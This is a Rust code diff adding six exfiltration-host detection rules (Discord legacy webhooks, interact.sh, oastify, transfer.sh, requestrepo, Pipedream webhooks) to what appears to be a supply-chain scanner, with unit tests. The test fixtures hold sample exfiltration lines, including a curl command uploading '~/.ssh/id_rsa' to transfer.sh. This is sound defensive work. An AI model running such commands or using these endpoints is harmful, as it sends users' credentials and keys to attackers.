@@ -31,7 +31,7 @@ use serde::Serialize;
 
 /// Version of the bundled catalog. Bump whenever the rule set changes
 /// so JSON consumers can tell which fingerprints were active.
-pub const CATALOG_VERSION: &str = "2026.05.17";
+pub const CATALOG_VERSION: &str = "2026.05.20";
 
 /// How many bytes of any single file the content scanner will read.
 /// 64 KiB easily covers `.npmrc`, `pyproject.toml`, lockfile metadata,
@@ -192,6 +192,98 @@ pub fn catalog() -> &'static [Rule] {
                           capture service in the same threat family as \
                           `webhook.site`. Legitimate use in a checkout is \
                           vanishingly rare.",
+        },
+        Rule {
+            id: "exfil.discord-legacy-webhook",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "discordapp.com/api/webhooks/",
+                basename_filter: None,
+            },
+            pattern: "discordapp.com/api/webhooks/",
+            description: "Legacy Discord webhook URL (`discordapp.com`) — \
+                          still routable, same threat shape as the canonical \
+                          `discord.com/api/webhooks/`. Catches droppers that \
+                          embed the older hostname to dodge a literal \
+                          `discord.com` grep.",
+        },
+        Rule {
+            id: "exfil.interactsh",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "interact.sh",
+                basename_filter: None,
+            },
+            pattern: "interact.sh",
+            description: "Reference to Project Discovery's `interact.sh` \
+                          OAST tool — the default exfil hostname in many \
+                          published payloads. Legitimate workspace files \
+                          essentially never embed it.",
+        },
+        Rule {
+            id: "exfil.oastify",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "oastify.com",
+                basename_filter: None,
+            },
+            pattern: "oastify.com",
+            description: "Reference to `oastify.com` — Burp Collaborator's \
+                          public hostname pool, used as an out-of-band \
+                          exfil / canary endpoint. Strong indicator the \
+                          file came out of a pentest payload generator.",
+        },
+        Rule {
+            id: "exfil.transfer-sh",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "transfer.sh",
+                basename_filter: None,
+            },
+            pattern: "transfer.sh",
+            description: "Reference to `transfer.sh` — a throwaway file-\
+                          upload service routinely used to stage exfiltrated \
+                          tarballs (creds, ssh keys, env dumps) before the \
+                          attacker pulls them down out of band.",
+        },
+        Rule {
+            id: "exfil.requestrepo",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "requestrepo.com",
+                basename_filter: None,
+            },
+            pattern: "requestrepo.com",
+            description: "Reference to `requestrepo.com` — modern \
+                          OAST/webhook capture service that has replaced \
+                          `requestbin` in several recent supply-chain \
+                          worm samples.",
+        },
+        Rule {
+            id: "exfil.pipedream-webhook",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                // Match the per-tenant webhook subdomain shape
+                // (`<id>.m.pipedream.net`) rather than the bare
+                // `pipedream.net` apex — the apex shows up in
+                // legitimate tutorial / config snippets, the
+                // `.m.pipedream.net` shape is webhook-only.
+                needle: "m.pipedream.net",
+                basename_filter: None,
+            },
+            pattern: "m.pipedream.net",
+            description: "Reference to a Pipedream webhook endpoint \
+                          (`*.m.pipedream.net`). The webhook subdomain is \
+                          extremely unusual outside automation pipelines; \
+                          a workspace file that embeds one is most likely \
+                          a dropper using Pipedream as a one-off exfil \
+                          sink.",
         },
     ]
 }
@@ -644,6 +736,69 @@ mod tests {
             "needle past cap should be a documented miss: {findings:#?}"
         );
         std::fs::remove_dir_all(&tmp).ok();
+    }
+
+    #[test]
+    fn discord_legacy_webhook_url_trips_rule() {
+        // Older Discord domain — same threat, common in droppers that
+        // were written before discord.com became canonical.
+        let bytes = b"fetch('https://discordapp.com/api/webhooks/9/abc', {body})";
+        let hits = matches_content("any.js", bytes);
+        assert!(
+            hits.iter().any(|r| r.id == "exfil.discord-legacy-webhook"),
+            "got: {:?}",
+            hits.iter().map(|r| r.id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn interactsh_oast_trips_rule() {
+        let bytes = b"const exfil = 'https://abcdef.interact.sh/'";
+        let hits = matches_content("steal.py", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.interactsh"));
+    }
+
+    #[test]
+    fn oastify_burp_collaborator_trips_rule() {
+        let bytes = b"requests.post('https://abc.oastify.com', data=dump)";
+        let hits = matches_content("postinstall.py", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.oastify"));
+    }
+
+    #[test]
+    fn transfer_sh_trips_rule() {
+        let bytes = b"curl --upload-file ~/.ssh/id_rsa https://transfer.sh/key";
+        let hits = matches_content("setup.sh", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.transfer-sh"));
+    }
+
+    #[test]
+    fn requestrepo_trips_rule() {
+        let bytes = b"url = 'https://xyz.requestrepo.com/r'";
+        let hits = matches_content("any.ts", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.requestrepo"));
+    }
+
+    #[test]
+    fn pipedream_webhook_subdomain_trips_rule_but_bare_apex_does_not() {
+        // Webhook-shaped URL → hit.
+        let dirty = b"axios.post('https://eo123.m.pipedream.net', payload)";
+        let hits = matches_content("dropper.js", dirty);
+        assert!(
+            hits.iter().any(|r| r.id == "exfil.pipedream-webhook"),
+            "webhook subdomain must trip rule"
+        );
+        // Bare `pipedream.net` (tutorial mention, README link to the
+        // marketing site) → no hit. Documents the deliberate FP
+        // mitigation we chose over needling the apex.
+        let benign = b"See https://pipedream.com or https://pipedream.net for the platform docs.";
+        let benign_hits = matches_content("README.md", benign);
+        assert!(
+            !benign_hits
+                .iter()
+                .any(|r| r.id == "exfil.pipedream-webhook"),
+            "bare apex must not trip rule (FP mitigation)"
+        );
     }
 
     #[test]
